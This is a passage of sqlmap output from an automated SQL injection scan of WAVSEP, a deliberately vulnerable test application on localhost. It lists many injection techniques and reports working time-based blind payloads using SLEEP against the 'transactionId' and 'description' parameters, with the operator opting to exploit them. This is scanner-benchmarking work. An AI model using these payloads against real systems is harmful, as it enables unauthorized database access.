[04:57:13] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT)'
[04:57:13] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT - original value)'
[04:57:13] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int)'
[04:57:13] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int - original value)'
[04:57:13] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
[04:57:13] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
[04:57:13] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
[04:57:13] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
[04:57:13] [INFO] testing 'MySQL >= 5.0 boolean-based blind - Stacked queries'
[04:57:13] [INFO] testing 'MySQL < 5.0 boolean-based blind - Stacked queries'
[04:57:13] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[04:57:13] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[04:57:14] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[04:57:14] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[04:57:14] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
[04:57:14] [INFO] testing 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)'
[04:57:14] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
[04:57:15] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
[04:57:15] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[04:57:15] [INFO] testing 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[04:57:15] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[04:57:15] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[04:57:16] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[04:57:16] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[04:57:16] [INFO] testing 'MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[04:57:16] [INFO] testing 'MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)'
[04:57:16] [INFO] testing 'MySQL OR error-based - WHERE or HAVING clause (FLOOR)'
[04:57:16] [INFO] testing 'MySQL >= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE)'
[04:57:17] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (BIGINT UNSIGNED)'
[04:57:17] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (EXP)'
[04:57:17] [INFO] testing 'MySQL >= 5.6 error-based - Parameter replace (GTID_SUBSET)'
[04:57:17] [INFO] testing 'MySQL >= 5.7.8 error-based - Parameter replace (JSON_KEYS)'
[04:57:17] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
[04:57:17] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (UPDATEXML)'
[04:57:17] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (EXTRACTVALUE)'
[04:57:17] [INFO] testing 'MySQL >= 5.5 error-based - ORDER BY, GROUP BY clause (BIGINT UNSIGNED)'
[04:57:17] [INFO] testing 'MySQL >= 5.5 error-based - ORDER BY, GROUP BY clause (EXP)'
[04:57:17] [INFO] testing 'MySQL >= 5.6 error-based - ORDER BY, GROUP BY clause (GTID_SUBSET)'
[04:57:17] [INFO] testing 'MySQL >= 5.7.8 error-based - ORDER BY, GROUP BY clause (JSON_KEYS)'
[04:57:17] [INFO] testing 'MySQL >= 5.0 error-based - ORDER BY, GROUP BY clause (FLOOR)'
[04:57:17] [INFO] testing 'MySQL >= 5.1 error-based - ORDER BY, GROUP BY clause (EXTRACTVALUE)'
[04:57:17] [INFO] testing 'MySQL >= 5.1 error-based - ORDER BY, GROUP BY clause (UPDATEXML)'
[04:57:17] [INFO] testing 'MySQL >= 4.1 error-based - ORDER BY, GROUP BY clause (FLOOR)'
[04:57:17] [INFO] testing 'MySQL inline queries'
[04:57:17] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[04:57:17] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
[04:57:17] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
[04:57:17] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
[04:57:17] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
[04:57:17] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'
[04:57:17] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[04:57:27] [INFO] GET parameter 'transactionId' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
[04:57:27] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[04:57:27] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[04:57:27] [INFO] testing 'Generic UNION query (random number) - 1 to 20 columns'
[04:57:27] [INFO] testing 'Generic UNION query (NULL) - 21 to 40 columns'
[04:57:28] [INFO] testing 'Generic UNION query (random number) - 21 to 40 columns'
[04:57:28] [INFO] testing 'Generic UNION query (NULL) - 41 to 60 columns'
[04:57:28] [INFO] testing 'Generic UNION query (random number) - 41 to 60 columns'
[04:57:28] [INFO] testing 'Generic UNION query (NULL) - 61 to 80 columns'
[04:57:28] [INFO] testing 'Generic UNION query (random number) - 61 to 80 columns'
[04:57:28] [INFO] testing 'Generic UNION query (NULL) - 81 to 100 columns'
[04:57:28] [INFO] testing 'Generic UNION query (random number) - 81 to 100 columns'
[04:57:28] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'
[04:57:28] [INFO] testing 'MySQL UNION query (random number) - 1 to 20 columns'
[04:57:28] [INFO] testing 'MySQL UNION query (NULL) - 21 to 40 columns'
[04:57:28] [INFO] testing 'MySQL UNION query (random number) - 21 to 40 columns'
[04:57:28] [INFO] testing 'MySQL UNION query (NULL) - 41 to 60 columns'
[04:57:28] [INFO] testing 'MySQL UNION query (random number) - 41 to 60 columns'
[04:57:29] [INFO] testing 'MySQL UNION query (NULL) - 61 to 80 columns'
[04:57:29] [INFO] testing 'MySQL UNION query (random number) - 61 to 80 columns'
[04:57:29] [INFO] testing 'MySQL UNION query (NULL) - 81 to 100 columns'
[04:57:29] [INFO] testing 'MySQL UNION query (random number) - 81 to 100 columns'
[04:57:29] [INFO] checking if the injection point on GET parameter 'transactionId' is a false positive
GET parameter 'transactionId' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 2892 HTTP(s) requests:
---
Parameter: transactionId (GET)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: transactionId=895 AND (SELECT 2043 FROM (SELECT(SLEEP(5)))YFjS)
---
do you want to exploit this SQL injection? [Y/n] Y
[04:58:19] [INFO] the back-end DBMS is MySQL
[04:58:19] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
web application technology: JSP
back-end DBMS: MySQL >= 5.0.12
[43/68] URL:
GET http://localhost:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Identical/Case05-InjectionInUpdate-String-TimeDelayExploit-200Identical.jsp?description=empty
do you want to test this URL? [Y/n/q]
> Y
[04:58:19] [INFO] testing URL 'http://localhost:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Identical/Case05-InjectionInUpdate-String-TimeDelayExploit-200Identical.jsp?description=empty'                                                                                                  
[04:58:19] [INFO] testing connection to the target URL
you have not declared cookie(s), while server wants to set its own ('JSESSIONID=D0E211ABE11...8EF2C6E0B9'). Do you want to use those [Y/n] Y
[04:58:19] [INFO] testing if GET parameter 'description' is dynamic
[04:58:19] [WARNING] GET parameter 'description' does not appear to be dynamic
[04:58:19] [WARNING] heuristic (basic) test shows that GET parameter 'description' might not be injectable
[04:58:19] [INFO] testing for SQL injection on GET parameter 'description'
[04:58:19] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[04:58:20] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
[04:58:20] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
[04:58:20] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[04:58:21] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[04:58:21] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
[04:58:21] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (comment)'
[04:58:21] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)'
[04:58:21] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[04:58:21] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL)'
[04:58:21] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL - original value)'
[04:58:21] [INFO] testing 'Boolean-based blind - Parameter replace (CASE)'
[04:58:21] [INFO] testing 'Boolean-based blind - Parameter replace (CASE - original value)'
[04:58:21] [INFO] testing 'HAVING boolean-based blind - WHERE, GROUP BY clause'
[04:58:21] [INFO] testing 'Generic inline queries'
[04:58:22] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[04:58:22] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[04:58:22] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
[04:58:22] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
[04:58:22] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
[04:58:22] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
[04:58:23] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
[04:58:23] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
[04:58:23] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (bool*int)'
[04:58:24] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (bool*int)'
[04:58:24] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET)'
[04:58:24] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET - original value)'
[04:58:24] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT)'
[04:58:24] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT - original value)'
[04:58:24] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int)'
[04:58:24] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int - original value)'
[04:58:24] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
[04:58:24] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
[04:58:24] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
[04:58:24] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
[04:58:24] [INFO] testing 'MySQL >= 5.0 boolean-based blind - Stacked queries'
[04:58:24] [INFO] testing 'MySQL < 5.0 boolean-based blind - Stacked queries'
[04:58:24] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[04:58:24] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[04:58:24] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[04:58:25] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[04:58:25] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
[04:58:25] [INFO] testing 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)'
[04:58:25] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
[04:58:25] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
[04:58:26] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[04:58:26] [INFO] testing 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[04:58:26] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[04:58:26] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[04:58:26] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[04:58:27] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[04:58:27] [INFO] testing 'MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[04:58:27] [INFO] testing 'MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)'
[04:58:27] [INFO] testing 'MySQL OR error-based - WHERE or HAVING clause (FLOOR)'
[04:58:27] [INFO] testing 'MySQL >= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE)'
[04:58:28] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (BIGINT UNSIGNED)'
[04:58:28] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (EXP)'
[04:58:28] [INFO] testing 'MySQL >= 5.6 error-based - Parameter replace (GTID_SUBSET)'
[04:58:28] [INFO] testing 'MySQL >= 5.7.8 error-based - Parameter replace (JSON_KEYS)'
[04:58:28] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
[04:58:28] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (UPDATEXML)'
[04:58:28] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (EXTRACTVALUE)'
[04:58:28] [INFO] testing 'MySQL >= 5.5 error-based - ORDER BY, GROUP BY clause (BIGINT UNSIGNED)'
[04:58:28] [INFO] testing 'MySQL >= 5.5 error-based - ORDER BY, GROUP BY clause (EXP)'
[04:58:28] [INFO] testing 'MySQL >= 5.6 error-based - ORDER BY, GROUP BY clause (GTID_SUBSET)'
[04:58:28] [INFO] testing 'MySQL >= 5.7.8 error-based - ORDER BY, GROUP BY clause (JSON_KEYS)'
[04:58:28] [INFO] testing 'MySQL >= 5.0 error-based - ORDER BY, GROUP BY clause (FLOOR)'
[04:58:28] [INFO] testing 'MySQL >= 5.1 error-based - ORDER BY, GROUP BY clause (EXTRACTVALUE)'
[04:58:28] [INFO] testing 'MySQL >= 5.1 error-based - ORDER BY, GROUP BY clause (UPDATEXML)'
[04:58:28] [INFO] testing 'MySQL >= 4.1 error-based - ORDER BY, GROUP BY clause (FLOOR)'
[04:58:28] [INFO] testing 'MySQL inline queries'
[04:58:28] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[04:58:28] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
[04:58:28] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
[04:58:28] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
[04:58:28] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
[04:58:28] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'
[04:58:28] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[04:58:38] [INFO] GET parameter 'description' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
[04:58:38] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[04:58:38] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[04:58:39] [INFO] testing 'Generic UNION query (random number) - 1 to 20 columns'
[04:58:39] [INFO] testing 'Generic UNION query (NULL) - 21 to 40 columns'
[04:58:39] [INFO] testing 'Generic UNION query (random number) - 21 to 40 columns'
[04:58:39] [INFO] testing 'Generic UNION query (NULL) - 41 to 60 columns'
[04:58:39] [INFO] testing 'Generic UNION query (random number) - 41 to 60 columns'
[04:58:39] [INFO] testing 'Generic UNION query (NULL) - 61 to 80 columns'
[04:58:39] [INFO] testing 'Generic UNION query (random number) - 61 to 80 columns'
[04:58:39] [INFO] testing 'Generic UNION query (NULL) - 81 to 100 columns'
[04:58:39] [INFO] testing 'Generic UNION query (random number) - 81 to 100 columns'
[04:58:39] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'
[04:58:39] [INFO] testing 'MySQL UNION query (random number) - 1 to 20 columns'
[04:58:39] [INFO] testing 'MySQL UNION query (NULL) - 21 to 40 columns'
[04:58:39] [INFO] testing 'MySQL UNION query (random number) - 21 to 40 columns'
[04:58:40] [INFO] testing 'MySQL UNION query (NULL) - 41 to 60 columns'
[04:58:40] [INFO] testing 'MySQL UNION query (random number) - 41 to 60 columns'
[04:58:40] [INFO] testing 'MySQL UNION query (NULL) - 61 to 80 columns'
[04:58:40] [INFO] testing 'MySQL UNION query (random number) - 61 to 80 columns'
[04:58:40] [INFO] testing 'MySQL UNION query (NULL) - 81 to 100 columns'
[04:58:40] [INFO] testing 'MySQL UNION query (random number) - 81 to 100 columns'
[04:58:40] [INFO] checking if the injection point on GET parameter 'description' is a false positive
GET parameter 'description' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 2904 HTTP(s) requests:
---
Parameter: description (GET)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: description=empty' AND (SELECT 9047 FROM (SELECT(SLEEP(5)))RphE)-- umQO
---
do you want to exploit this SQL injection? [Y/n] Y
[04:59:35] [INFO] the back-end DBMS is MySQL
[04:59:35] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
web application technology: JSP
back-end DBMS: MySQL >= 5.0.12
[44/68] URL:
GET http://localhost:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Identical/Case06-InjectionInUpdate-Date-TimeDelayExploit-200Identical.jsp?transactionDate=2010-02-02
do you want to test this URL? [Y/n/q]
> Y
[04:59:35] [INFO] testing URL 'http://localhost:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Identical/Case06-InjectionInUpdate-Date-TimeDelayExploit-200Identical.jsp?transactionDate=2010-02-02'                                                                                           
[04:59:35] [INFO] testing connection to the target URL
you have not declared cookie(s), while server wants to set its own ('JSESSIONID=8E1A8E31237...C07C452492'). Do you want to use those [Y/n] Y
[04:59:35] [INFO] testing if GET parameter 'transactionDate' is dynamic
[04:59:35] [WARNING] GET parameter 'transactionDate' does not appear to be dynamic
[04:59:35] [WARNING] heuristic (basic) test shows that GET parameter 'transactionDate' might not be injectable
[04:59:35] [INFO] testing for SQL injection on GET parameter 'transactionDate'
[04:59:35] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[04:59:36] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
[04:59:36] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
[04:59:37] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[04:59:37] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[04:59:37] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
[04:59:37] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (comment)'
[04:59:37] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)'
[04:59:38] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[04:59:38] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL)'
[04:59:38] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL - original value)'
[04:59:38] [INFO] testing 'Boolean-based blind - Parameter replace (CASE)'
[04:59:38] [INFO] testing 'Boolean-based blind - Parameter replace (CASE - original value)'
[04:59:38] [INFO] testing 'HAVING boolean-based blind - WHERE, GROUP BY clause'
[04:59:38] [INFO] testing 'Generic inline queries'
[04:59:38] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[04:59:38] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[04:59:38] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
[04:59:38] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
[04:59:39] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
[04:59:39] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
[04:59:39] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
[04:59:40] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
[04:59:40] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (bool*int)'
[04:59:40] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (bool*int)'
[04:59:40] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET)'
[04:59:40] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET - original value)'
[04:59:40] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT)'
[04:59:40] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT - original value)'
[04:59:40] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int)'
[04:59:40] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int - original value)'
[04:59:40] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
[04:59:40] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
[04:59:40] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
[04:59:40] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
[04:59:40] [INFO] testing 'MySQL >= 5.0 boolean-based blind - Stacked queries'
[04:59:41] [INFO] testing 'MySQL < 5.0 boolean-based blind - Stacked queries'
[04:59:41] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[04:59:41] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[04:59:41] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[04:59:41] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[04:59:42] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
[04:59:42] [INFO] testing 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)'
[04:59:42] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
[04:59:42] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
[04:59:43] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[04:59:43] [INFO] testing 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[04:59:43] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[04:59:43] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[04:59:43] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[04:59:44] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[04:59:44] [INFO] testing 'MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[04:59:44] [INFO] testing 'MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)'
[04:59:44] [INFO] testing 'MySQL OR error-based - WHERE or HAVING clause (FLOOR)'
[04:59:44] [INFO] testing 'MySQL >= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE)'
[04:59:45] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (BIGINT UNSIGNED)'
[04:59:45] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (EXP)'
[04:59:45] [INFO] testing 'MySQL >= 5.6 error-based - Parameter replace (GTID_SUBSET)'
[04:59:45] [INFO] testing 'MySQL >= 5.7.8 error-based - Parameter replace (JSON_KEYS)'
[04:59:45] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
[04:59:45] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (UPDATEXML)'
[04:59:45] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (EXTRACTVALUE)'
[04:59:45] [INFO] testing 'MySQL >= 5.5 error-based - ORDER BY, GROUP BY clause (BIGINT UNSIGNED)'
[04:59:45] [INFO] testing 'MySQL >= 5.5 error-based - ORDER BY, GROUP BY clause (EXP)'
[04:59:45] [INFO] testing 'MySQL >= 5.6 error-based - ORDER BY, GROUP BY clause (GTID_SUBSET)'
[04:59:45] [INFO] testing 'MySQL >= 5.7.8 error-based - ORDER BY, GROUP BY clause (JSON_KEYS)'
[04:59:45] [INFO] testing 'MySQL >= 5.0 error-based - ORDER BY, GROUP BY clause (FLOOR)'
[04:59:45] [INFO] testing 'MySQL >= 5.1 error-based - ORDER BY, GROUP BY clause (EXTRACTVALUE)'
[04:59:45] [INFO] testing 'MySQL >= 5.1 error-based - ORDER BY, GROUP BY clause (UPDATEXML)'
[04:59:45] [INFO] testing 'MySQL >= 4.1 error-based - ORDER BY, GROUP BY clause (FLOOR)'
[04:59:45] [INFO] testing 'MySQL inline queries'
[04:59:45] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[04:59:45] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
[04:59:45] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
[04:59:45] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
[04:59:45] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
[04:59:45] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'
[04:59:46] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[04:59:56] [INFO] GET parameter 'transactionDate' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
[04:59:56] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[04:59:56] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[04:59:56] [INFO] testing 'Generic UNION query (random number) - 1 to 20 columns'
[04:59:56] [INFO] testing 'Generic UNION query (NULL) - 21 to 40 columns'
[04:59:56] [INFO] testing 'Generic UNION query (random number) - 21 to 40 columns'
[04:59:56] [INFO] testing 'Generic UNION query (NULL) - 41 to 60 columns'
[04:59:56] [INFO] testing 'Generic UNION query (random number) - 41 to 60 columns'
[04:59:56] [INFO] testing 'Generic UNION query (NULL) - 61 to 80 columns'
[04:59:56] [INFO] testing 'Generic UNION query (random number) - 61 to 80 columns'
[04:59:56] [INFO] testing 'Generic UNION query (NULL) - 81 to 100 columns'
[04:59:56] [INFO] testing 'Generic UNION query (random number) - 81 to 100 columns'
[04:59:56] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'
[04:59:56] [INFO] testing 'MySQL UNION query (random number) - 1 to 20 columns'
[04:59:56] [INFO] testing 'MySQL UNION query (NULL) - 21 to 40 columns'
[04:59:57] [INFO] testing 'MySQL UNION query (random number) - 21 to 40 columns'
